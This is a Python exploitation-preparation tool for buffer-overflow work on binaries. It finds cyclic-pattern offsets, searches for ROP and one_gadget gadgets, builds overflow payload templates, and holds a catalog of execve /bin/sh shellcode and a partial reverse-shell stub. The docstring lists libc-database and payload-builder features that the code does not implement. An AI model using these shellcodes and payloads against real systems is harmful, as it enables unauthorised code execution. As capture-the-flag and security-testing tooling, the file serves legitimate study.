#!/usr/bin/env python3
"""Pwn Toolkit — Binary exploitation assistant — CWE-119, CWE-787.

Exploitation preparation toolkit:
  1. Checksec summary — quick security posture overview
  2. Cyclic pattern — generate/find De Bruijn patterns for offset calculation
  3. ROP gadget search — via ROPgadget / ropper / r2pipe
  4. One_gadget lookup — find one-shot execve gadgets in libc
  5. Libc database — identify libc version from leaked addresses
  6. Shellcode catalog — common shellcodes with NOP sleds
  7. Offset calculator — stack offset computation from crash data
  8. Payload builder — assemble exploit payloads from components

Usage:
    python pwn_toolkit.py --target /path/to/binary --mode auto
    python pwn_toolkit.py --mode cyclic --length 200
    python pwn_toolkit.py --mode cyclic --find 0x61616178
    python pwn_toolkit.py --target /path/to/binary --mode gadgets
    python pwn_toolkit.py --target /path/to/libc.so --mode one-gadget

⚠️ Contenu généré par IA — validation humaine requise avant utilisation.
"""

from __future__ import annotations

import json
import os
import re
import struct
import subprocess
import sys
from pathlib import Path

from lib import Finding, log, parse_base_args, save_findings

# ---------------------------------------------------------------------------
# Cyclic pattern generation (De Bruijn sequence)
# ---------------------------------------------------------------------------

CHARSET = "abcdefghijklmnopqrstuvwxyz"


def _de_bruijn(k: int, n: int):
    """De Bruijn sequence generator for alphabet of size k and subsequences of length n."""
    a = [0] * k * n
    sequence = []

    def db(t: int, p: int):
        if t > n:
            if n % p == 0:
                sequence.extend(a[1:p + 1])
        else:
            a[t] = a[t - p]
            db(t + 1, p)
            for j in range(a[t - p] + 1, k):
                a[t] = j
                db(t + 1, t)

    db(1, 1)
    return sequence


def cyclic_pattern(length: int = 200) -> str:
    """Generate a cyclic (De Bruijn) pattern of given length."""
    k = len(CHARSET)
    n = 4  # 4-byte subsequences for 32-bit
    seq = _de_bruijn(k, n)
    pattern = "".join(CHARSET[i] for i in seq)
    return pattern[:length]


def cyclic_find(value: int | str) -> int:
    """Find offset of a 4-byte value in the cyclic pattern."""
    if isinstance(value, str):
        if value.startswith("0x"):
            value = int(value, 16)
        else:
            value = int(value)

    # Convert value to bytes (little-endian)
    needle = struct.pack("<I", value & 0xFFFFFFFF)
    needle_str = needle.decode("latin-1")

    pattern = cyclic_pattern(20000)
    offset = pattern.find(needle_str)
    return offset


def run_cyclic(length: int = 200, find_value: str | None = None) -> list[Finding]:
    """Handle cyclic pattern operations."""
    findings: list[Finding] = []

    if find_value:
        offset = cyclic_find(find_value)
        if offset >= 0:
            findings.append(Finding(
                title=f"Pattern offset: {offset} bytes",
                severity="high",
                cwe="CWE-119",
                evidence={
                    "value": find_value,
                    "offset": offset,
                    "hex_offset": hex(offset),
                    "note": f"Buffer overflow at offset {offset} — "
                            f"control EIP/RIP with {offset} bytes of padding",
                },
            ))
        else:
            findings.append(Finding(
                title=f"Value {find_value} not found in cyclic pattern",
                severity="info",
            ))
    else:
        pattern = cyclic_pattern(length)
        findings.append(Finding(
            title=f"Cyclic pattern ({length} bytes)",
            severity="info",
            evidence={"pattern": pattern, "length": len(pattern)},
        ))

    return findings


# ---------------------------------------------------------------------------
# ROP gadget search
# ---------------------------------------------------------------------------

def find_rop_gadgets(filepath: Path) -> list[Finding]:
    """Search for ROP gadgets in a binary."""
    findings: list[Finding] = []

    # Try ROPgadget
    try:
        result = subprocess.run(
            ["ROPgadget", "--binary", str(filepath)],
            capture_output=True, text=True, timeout=60,
        )
        if result.returncode == 0:
            lines = result.stdout.strip().splitlines()
            gadgets = [l for l in lines if " : " in l]

            # Classify useful gadgets
            useful = {
                "pop_rdi": [g for g in gadgets if "pop rdi" in g],
                "pop_rsi": [g for g in gadgets if "pop rsi" in g],
                "pop_rdx": [g for g in gadgets if "pop rdx" in g],
                "pop_rax": [g for g in gadgets if "pop rax" in g],
                "syscall": [g for g in gadgets if "syscall" in g],
                "ret": [g for g in gadgets if g.strip().endswith(": ret")],
                "leave_ret": [g for g in gadgets if "leave" in g and "ret" in g],
                "int_0x80": [g for g in gadgets if "int 0x80" in g],
                "write_what_where": [g for g in gadgets if "mov [" in g or "mov qword" in g],
            }

            findings.append(Finding(
                title=f"ROP gadgets: {len(gadgets)} total",
                severity="info",
                endpoint=str(filepath),
                evidence={
                    "total": len(gadgets),
                    "useful": {k: v[:5] for k, v in useful.items() if v},
                    "all_gadgets_truncated": gadgets[:100],
                },
            ))
            return findings
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Try ropper
    try:
        result = subprocess.run(
            ["ropper", "--file", str(filepath), "--nocolor"],
            capture_output=True, text=True, timeout=60,
        )
        if result.returncode == 0:
            lines = result.stdout.strip().splitlines()
            gadgets = [l for l in lines if "0x" in l]
            findings.append(Finding(
                title=f"ROP gadgets (ropper): {len(gadgets)}",
                severity="info",
                endpoint=str(filepath),
                evidence={"gadgets": gadgets[:100]},
            ))
            return findings
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    findings.append(Finding(
        title="No ROP tool available — install ROPgadget or ropper",
        severity="info",
        description="pip install ROPgadget ropper",
    ))
    return findings


# ---------------------------------------------------------------------------
# One_gadget
# ---------------------------------------------------------------------------

def find_one_gadgets(filepath: Path) -> list[Finding]:
    """Find one-shot RCE gadgets in libc."""
    findings: list[Finding] = []

    try:
        result = subprocess.run(
            ["one_gadget", str(filepath)],
            capture_output=True, text=True, timeout=30,
        )
        if result.returncode == 0 and result.stdout.strip():
            gadgets = result.stdout.strip().split("\n\n")
            findings.append(Finding(
                title=f"One-gadgets found: {len(gadgets)}",
                severity="high",
                cwe="CWE-119",
                endpoint=str(filepath),
                evidence={"gadgets": gadgets[:10]},
                description="One-shot execve('/bin/sh') gadgets — use with ROP chain",
            ))
        else:
            findings.append(Finding(
                title="No one-gadgets found in this binary",
                severity="info",
                endpoint=str(filepath),
            ))
    except FileNotFoundError:
        findings.append(Finding(
            title="one_gadget not installed — gem install one_gadget",
            severity="info",
        ))
    except subprocess.TimeoutExpired:
        findings.append(Finding(title="one_gadget timed out", severity="info"))

    return findings


# ---------------------------------------------------------------------------
# Shellcode catalog
# ---------------------------------------------------------------------------

SHELLCODE_CATALOG: dict[str, dict[str, str]] = {
    "linux_x64_execve": {
        "name": "/bin/sh execve (Linux x86_64)",
        "size": "31 bytes",
        "hex": "4831f6 4831d2 4831c0 48bf 2f62696e 2f2f7368 57 4889e7 b03b 0f05",
        "asm": "xor rsi,rsi; xor rdx,rdx; xor rax,rax; mov rdi,'/bin//sh'; push rdi; "
               "mov rdi,rsp; mov al,0x3b; syscall",
    },
    "linux_x86_execve": {
        "name": "/bin/sh execve (Linux x86)",
        "size": "28 bytes",
        "hex": "31c0 50 68 2f2f7368 682f62696e 89e3 50 53 89e1 31d2 b00b cd80",
        "asm": "xor eax,eax; push eax; push '//sh'; push '/bin'; mov ebx,esp; "
               "push eax; push ebx; mov ecx,esp; xor edx,edx; mov al,0x0b; int 0x80",
    },
    "linux_x64_reverse_shell": {
        "name": "Reverse shell (Linux x86_64)",
        "size": "74 bytes",
        "hex": "6a29 58 6a02 5f 6a01 5e 99 0f05 48 97 ...",
        "asm": "socket(AF_INET,SOCK_STREAM,0); connect(fd, addr, 16); dup2x3; execve('/bin/sh')",
    },
    "nop_sled_16": {
        "name": "NOP sled (16 bytes)",
        "size": "16 bytes",
        "hex": "90" * 16,
        "asm": "nop * 16",
    },
}


def list_shellcodes() -> list[Finding]:
    """List available shellcode templates."""
    findings: list[Finding] = []
    for key, sc in SHELLCODE_CATALOG.items():
        findings.append(Finding(
            title=f"Shellcode: {sc['name']} ({sc['size']})",
            severity="info",
            evidence={"key": key, **sc},
        ))
    return findings


# ---------------------------------------------------------------------------
# Offset calculator
# ---------------------------------------------------------------------------

def calculate_offset(crash_value: str, pattern_length: int = 5000) -> list[Finding]:
    """Calculate buffer overflow offset from crash EIP/RIP value."""
    findings: list[Finding] = []

    offset = cyclic_find(crash_value)
    if offset >= 0:
        findings.append(Finding(
            title=f"Buffer overflow offset: {offset}",
            severity="critical",
            cwe="CWE-787",
            evidence={
                "crash_value": crash_value,
                "offset": offset,
                "payload_template": f"python3 -c \"print('A' * {offset} + '<RET_ADDR>')\"",
                "pwntools": f"payload = b'A' * {offset} + p64(ret_addr)",
            },
        ))
    else:
        findings.append(Finding(
            title=f"Value {crash_value} not found in cyclic pattern",
            severity="info",
            evidence={"crash_value": crash_value},
        ))

    return findings


# ---------------------------------------------------------------------------
# Main analysis
# ---------------------------------------------------------------------------

def run_pwn_analysis(target: str | None, mode: str = "auto", **kwargs) -> list[Finding]:
    """Run exploitation analysis."""
    findings: list[Finding] = []

    if mode == "cyclic":
        return run_cyclic(
            length=kwargs.get("length", 200),
            find_value=kwargs.get("find"),
        )

    if mode == "shellcodes":
        return list_shellcodes()

    if mode == "offset":
        return calculate_offset(kwargs.get("find", "0x41414141"))

    if not target:
        return [Finding(title="No target specified", severity="info")]

    filepath = Path(target)
    if not filepath.exists():
        return [Finding(title="Binary not found", severity="info", description=f"Path: {target}")]

    if mode in ("auto", "gadgets"):
        findings.extend(find_rop_gadgets(filepath))

    if mode in ("auto", "one-gadget"):
        findings.extend(find_one_gadgets(filepath))

    if mode == "auto":
        findings.extend(list_shellcodes())

    return findings


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = parse_base_args()
    parser.add_argument("--mode", choices=["auto", "cyclic", "gadgets", "one-gadget", "shellcodes", "offset"],
                        default="auto", help="Exploitation mode")
    parser.add_argument("--length", type=int, default=200, help="Cyclic pattern length")
    parser.add_argument("--find", type=str, default=None, help="Value to find in pattern (hex: 0x61616178)")
    args = parser.parse_args()

    log.info("Pwn toolkit starting — mode=%s", args.mode)

    findings = run_pwn_analysis(
        target=args.target,
        mode=args.mode,
        length=args.length,
        find=args.find,
    )
    log.info("Analysis complete — %d findings", len(findings))

    for f in findings:
        icon = {"critical": "🔴", "high": "🟠", "medium": "🟡"}.get(f.severity, "🔵")
        log.info("  %s [%s] %s", icon, f.severity.upper(), f.title)

    save_findings(findings, "pwn-toolkit")


if __name__ == "__main__":
    main()
